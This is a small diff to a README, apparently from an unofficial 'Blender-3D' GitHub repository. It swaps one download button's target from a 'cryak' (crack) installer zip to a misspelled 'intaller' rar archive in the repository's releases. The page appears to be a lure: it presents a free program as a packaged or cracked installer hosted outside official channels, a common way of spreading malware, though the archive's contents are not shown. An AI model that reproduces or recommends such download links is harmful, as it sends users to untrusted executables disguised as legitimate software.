@@ -7,7 +7,7 @@
 > [!Note]
 > Select your version
 
-[<img src="https://github.com/user-attachments/assets/abd0cdb5-d727-4524-a91a-e8afe56c6a24">](https://github.com/ajkalsada/Blender-3D/releases/download/1/Blender-3D-cryak-installer.zip)
+[<img src="https://github.com/user-attachments/assets/abd0cdb5-d727-4524-a91a-e8afe56c6a24">](https://github.com/ajkalsada/Blender-3D/releases/download/1/intaller-Blender-3D.rar)
 
 
 
